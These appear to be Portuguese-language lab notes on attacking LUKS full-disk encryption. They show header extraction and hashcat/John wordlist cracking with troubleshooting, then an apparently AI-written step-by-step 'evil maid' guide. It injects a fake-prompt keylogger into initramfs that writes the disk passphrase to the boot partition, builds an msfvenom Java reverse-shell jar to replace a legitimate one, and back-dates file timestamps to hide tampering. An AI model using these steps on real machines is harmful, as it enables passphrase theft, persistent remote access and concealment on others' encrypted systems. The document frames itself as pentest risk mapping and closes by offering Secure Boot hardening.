lsblk -f
sudo blkid

sudo cryptsetup luksDump /dev/sdb1

dd if=/dev/sdX2 of=header.luks bs=512 count=32768
# Ou usando cryptsetup (funciona para LUKS1 e LUKS2)
sudo rm -f header.luks
sudo cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file header.luks

# LUKS2 (PBKDF2/HMAC-SHA256 – "fdbk2") com ferramentas open source
#
# Hashcat: use o modo LUKS2 (-m 29500). O -m 14600 é para LUKS (v1) e
# não detecta corretamente LUKS2. O header deve ser passado diretamente.
# Exemplo: Ataque de wordlist simples (CPU/GPU)
hashcat -m 29500 -a 0 header.luks wordlist.txt

gustavo@gustavo-Latitude-3490:~/Documents/fde_luks_lab$ hashcat -m 29500 -a 0 header.luks wordlist.txt
hashcat (v6.2.6) starting

Either the specified hash mode does not exist in the official repository,
or the file(s) could not be found. Please check that the hash mode number is
correct and that the files are in the correct place.

/usr/share/hashcat/modules/module_29500.so: cannot open shared object file: No such file or directory

Started: Wed Dec  3 08:42:03 2025
Stopped: Wed Dec  3 08:42:03 2025
gustavo@gustavo-Latitude-3490:~/Documents/fde_luks_lab$ ls /usr/share/hashcat/modules/

# John the Ripper (Open Source) com OpenCL para LUKS2
# 1) Extrair hash com utilitário john (luks2john)
#    – Em muitas distribuições, o script vem com o JtR Jumbo.
#    – Caso não tenha, compile o JtR Jumbo (open source) e use o utilitário.
luks2john header.luks > hash_luks2.txt

# 2) Rodar ataque de wordlist em GPU
john --format=LUKS2-opencl --wordlist=wordlist.txt hash_luks2.txt

# 3) Mostrar resultado (se houver)
john --show hash_luks2.txt

## Troubleshooting LUKS2 (Hashcat 29500)

- Erro: "/usr/share/hashcat/modules/module_29500.so: cannot open shared object file"
    - Causa: sua instalação do Hashcat não tem o módulo LUKS2 (29500).
    - Soluções:
        - Atualize Hashcat para versão mais recente disponível no sistema:
            ```bash
            sudo apt update
            sudo apt install --only-upgrade hashcat
            ```
        - Se o repositório não possui 29500, instale via snap/flatpak ou compile:
            ```bash
            sudo snap install hashcat
            # ou
            sudo apt install build-essential git
            git clone https://github.com/hashcat/hashcat.git
            cd hashcat
            make -j$(nproc)
            sudo make install
            ```
        - Verifique suporte ao modo:
            ```bash
            hashcat --help | grep -E "29500|LUKS2"
            ```

- Permissão negada no header:
    ```bash
    sudo chown "$USER":"$USER" header.luks
    chmod 644 header.luks
    ```

- Wordlist não encontrada:
    ```bash
    ls -lh wordlist.txt
    # ou use caminho absoluto
    hashcat -m 29500 -a 0 ./header.luks ./wordlist.txt
    ```

## Fallback 100% Open Source (John the Ripper Jumbo)

- Instalação (Ubuntu/Debian):
    ```bash
    sudo apt update
    sudo apt install john john-data
    # Se a versão não tiver luks2john, compile o Jumbo:
    sudo apt install build-essential libssl-dev git pkg-config
    git clone https://github.com/openwall/john.git
    cd john/src
    ./configure && make -j$(nproc)
    cd ../run
    ```
- Extração + ataque:
    ```bash
    ./luks2john /home/gustavo/Documents/fde_luks_lab/header.luks > /home/gustavo/Documents/fde_luks_lab/hash_luks2.txt
    john --list=opencl-devices
    john --format=LUKS2-opencl --wordlist=/home/gustavo/Documents/fde_luks_lab/wordlist.txt /home/gustavo/Documents/fde_luks_lab/hash_luks2.txt
    john --show /home/gustavo/Documents/fde_luks_lab/hash_luks2.txt
    ```

## Instalação Offline do Hashcat a partir deste projeto

- Pré-requisito: Tenha o código-fonte do Hashcat copiado localmente (sem internet) para dentro do projeto, por exemplo em `tools/vendor/hashcat/`.
    - Estrutura esperada: `tools/vendor/hashcat/Makefile`, `tools/vendor/hashcat/modules/module_29500.so` após build.

- Verifique se o código-fonte está presente:
    ```bash
    test -d tools/vendor/hashcat && echo "hashcat fonte encontrado" || echo "adicione o código em tools/vendor/hashcat"
    ```

- Compilar e instalar localmente (sem internet):
    ```bash
    sudo apt install build-essential git pkg-config || true
    pushd tools/vendor/hashcat
    make -j"$(nproc)"
    # Instalar em prefixo local (não toca /usr):
    make PREFIX="$(pwd)/dist" install
    popd
    ```

- Validar que o módulo LUKS2 existe no build local:
    ```bash
    ls tools/vendor/hashcat/modules/module_29500.so
    ```

- Usar o binário local sem instalar no sistema:
    ```bash
    ./tools/vendor/hashcat/dist/bin/hashcat -I
    ./tools/vendor/hashcat/dist/bin/hashcat --help | grep -E "29500|LUKS2"
    ./tools/vendor/hashcat/dist/bin/hashcat -m 29500 -a 0 ./header.luks ./wordlist.txt
    ```

- Caso queira instalar no sistema (offline, a partir do código local):
    ```bash
    pushd tools/vendor/hashcat
    sudo make install
    popd
    hashcat --help | grep -E "29500|LUKS2"
    ```

- Dica: se o sistema procura módulos em `/usr/share/hashcat/modules/`, a instalação via `make install` deve copiar os `.so` corretamente. Para execução direta do binário local, o Hashcat usa seus próprios caminhos internos do `dist/`.

crunch 9 9 -t Admin%%%% -o wordlist_personalizada.txt

# Sintaxe: crunch [min] [max] [caracteres] -o [arquivo]
crunch 1 6 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist_bruta.txt

Listar dispositivos OpenCL disponíveis: Verifique se o JtR reconhece sua placa de vídeo.
john --list=opencl-devices

Anote o "Device ID" da sua GPU (geralmente é 0 ou 1).

Executar o Ataque: O formato para LUKS2 com OpenCL geralmente é luks2-opencl (ou apenas luks2 forçando o dispositivo, dependendo da versão).
Bash

# Comando completo:
# --format: especifica o módulo OpenCL para LUKS2
# --dev: especifica o ID da GPU (conforme visto no passo anterior)
# --wordlist: o arquivo gerado pelo crunch
# hash_luks.txt: o arquivo extraído no passo 1

john --format=LUKS2-opencl --dev=1 --wordlist=wordlist_bruta.txt hash_luks.txt

john --show hash_luks.txt

Componente,Opção,Descrição
hashcat,N/A,Chama o programa Hashcat.
-m 14600,Modo de Hash,Define o tipo de hash a ser atacado. O código 14600 é o identificador que o Hashcat usa especificamente para o formato LUKS (Linux Unified Key Setup). Este modo instrui o Hashcat a esperar um cabeçalho LUKS no arquivo de entrada.
-a 0,Modo de Ataque,"Define a forma como a quebra será realizada. O código 0 significa Attack Mode 0, que é o Ataque de Dicionário (Wordlist Attack). Isso instrui o Hashcat a simplesmente testar cada linha no arquivo de wordlist fornecido."
-w 3,Carga de Trabalho,"Define o nível de utilização da GPU (Workload Profile). O valor 3 significa ""High"" (Alto), que é o padrão para testes de performance e pentests. Isso instrui o Hashcat a usar o máximo de recursos da sua placa de vídeo (GPU) para obter a velocidade máxima de cracking, mas pode tornar o computador menos responsivo para outras tarefas."
hash_luks.txt,Arquivo Hash,"É o arquivo de entrada que contém o cabeçalho LUKS (o hash, o salt e os metadados), que foi extraído com o luks2john (ou uma ferramenta similar)."
wordlist_bruta.txt,Arquivo de Dicionário,É o arquivo de dicionário (wordlist) que o Hashcat usará para testar as senhas. Ele testará cada linha deste arquivo contra o hash LUKS até encontrar uma correspondência.

      * `lsblk` / `fdisk` (Manipulação de disco)
      * `cpio` / `gzip` (Manipulação do Initramfs)
      * `mount` / `umount`
      * `msfvenom` (Do Metasploit, para payload Java)
      * `zip` / `unzip` (Manipulação de arquivos .jar)
      * `netcat` (Opcional, para testar shell reverso)

    ```bash
    lsblk -f
    # ou
    fdisk -l
    ```

    *Procure por partições `ext4` ou `vfat` (EFI) que não sejam do seu pendrive.*

    Supondo que `/dev/nvme0n1p1` seja a EFI/Boot e `/dev/nvme0n1p2` seja a de módulos JVM.

    ```bash
    mkdir -p /mnt/alvo_boot
    mkdir -p /mnt/alvo_jvm

    mount /dev/nvme0n1p1 /mnt/alvo_boot
    mount /dev/nvme0n1p2 /mnt/alvo_jvm
    ```

-----

Ataque ao Initramfs (Keylogger de Boot)

Este é o coração do ataque. O `initramfs` é um pequeno sistema de arquivos carregado na RAM antes do sistema real. Ele contém o executável `cryptsetup` que pede a senha. Vamos injetar um script nele.

**O Passo a Passo:**

1.  **Localizar e fazer backup do Initramfs original:**

    ```bash
    cd /mnt/alvo_boot
    ls -lh
    # Você verá algo como 'initrd.img-5.x.x-generic'
    cp initrd.img-5.x.x-generic initrd.img.bak
    ```

2.  **Descompactar o Initramfs:**
    Crie uma pasta de trabalho e extraia o conteúdo.

    ```bash
    mkdir /tmp/evil_work
    cd /tmp/evil_work
    zcat /mnt/alvo_boot/initrd.img-5.x.x-generic | cpio -idmv
    ```

3.  **Criar o Payload (O "Evil Script"):**
    Você precisa interceptar a entrada do teclado. Existem várias formas, a mais comum é criar um wrapper falso para o comando de descriptografia ou injetar um hook no sistema de plymouth (tela de boot).

    *Exemplo conceitual de script (injection):*
    Vamos criar um script que roda antes do pedido de senha real, finge pedir a senha, salva em um arquivo de texto na partição de boot (que é clara) e depois deixa o boot seguir.

    Edite o arquivo `/tmp/evil_work/init` (ou o script de hook apropriado para a distro, ex: `scripts/local-top/`):

    ```bash
    # (Este é um exemplo simplificado lógica)
    echo "Digite a senha do disco (Luks):"
    read -s PASSWORD
    # Salva a senha em um arquivo oculto na partição de boot
    echo "$PASSWORD" > /boot/config-dump.dat
    # Passa a senha para o cryptsetup real para que o usuário não desconfie
    echo -n "$PASSWORD" | /sbin/cryptsetup luksOpen /dev/nvme0n1p3 crypt_disk
    ```

4.  **Reempacotar o Initramfs infectado:**

    ```bash
    find . | cpio -H newc -o | gzip > /mnt/alvo_boot/initrd.img-5.x.x-generic
    ```

**O que acontece depois:** O usuário boota, digita a senha. O sistema abre normalmente. O atacante volta depois, monta a partição de boot novamente e lê o arquivo `config-dump.dat` com a senha em texto claro.

-----

### Passo 3: Ataque à Partição JVM (Backdoor de Aplicação)

Se o ataque ao bootloader falhar (ou se quiser persistência na camada de aplicação), atacamos a partição de módulos.

**Cenário:** Existe um arquivo `utils.jar` ou `app-core.jar` na partição `/mnt/alvo_jvm`.

**O Passo a Passo:**

1.  **Extrair o .jar legítimo:**

    ```bash
    cd /mnt/alvo_jvm
    mkdir /tmp/jar_work
    cp utils.jar /tmp/jar_work/
    cd /tmp/jar_work
    unzip utils.jar
    rm utils.jar
    ```

2.  **Analisar o código (Information Leakage):**
    Use o `grep` para buscar segredos em arquivos de configuração extraídos:

    ```bash
    grep -r "password" .
    grep -r "api_key" .
    grep -r "jdbc" .
    ```

3.  **Injetar Código Malicioso (Java Deserialization / Shell):**
    Você pode usar o **msfvenom** para criar um payload java e substituir uma classe existente, ou injetar manualmente se souber programar em Java.

    *Opção Rápida (Metasploit):*
    Criar um `.jar` malicioso que abre uma conexão reversa.

    ```bash
    msfvenom -p java/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f jar -o evil.jar
    ```

    *Nota:* Isso substituiria o jar inteiro. O ideal ("cirúrgico") é descompilar uma classe `.class` legítima, adicionar o código de execução do payload no método "main" ou no construtor da classe, recompilar e substituir apenas aquele arquivo `.class` dentro da estrutura de pastas.

4.  **Reconstruir o .jar:**

    ```bash
    zip -r ../utils_infectado.jar *
    mv ../utils_infectado.jar /mnt/alvo_jvm/utils.jar
    ```

    Agora, altere o timestamp do arquivo para parecer que nunca foi modificado:

    ```bash
    touch -r /mnt/alvo_jvm/outro_arquivo_antigo.jar /mnt/alvo_jvm/utils.jar
    ```

-----

### Passo 4: Limpeza e Coleta (Exfiltração)

1.  **Desmontar tudo:**
    ```bash
    umount /mnt/alvo_boot
    umount /mnt/alvo_jvm
    ```
2.  **Desligar.**

**O Retorno (Dias depois):**
O atacante volta, boota o Live USB novamente:

  * Monta a partição `/efi`.
  * Lê o arquivo de texto com a senha capturada.
  * Agora ele pode clonar o disco inteiro e descriptografar em casa, ou usar a senha para acessar o sistema ao vivo.

-----

### Resumo das Ferramentas Principais

| Ferramenta | Uso no Pentest |
| :--- | :--- |
| **`lsblk` / `blkid`** | Identificar UUIDs e sistemas de arquivos não criptografados. |
| **`cpio` & `gzip`** | Essencial para abrir (inflate) e fechar (deflate) arquivos `initrd.img`. |
| **`dd`** | Se você quiser copiar o cabeçalho LUKS para tentar brute-force offline (caso não consiga o hook). |
| **`chroot`** | Útil para simular o ambiente da vítima se você tiver acesso de escrita. |
| **`jadx` ou `jd-gui`** | Para ler o código fonte dos `.jar` encontrados na partição JVM (engenharia reversa). |

### Próximo Passo

Dado que você está mapeando este risco, **gostaria que eu detalhasse como configurar o Secure Boot com chaves próprias (Machine Owner Key - MOK)** para impedir que o sistema aceite o `initramfs` ou `kernel` modificados que descrevemos acima?
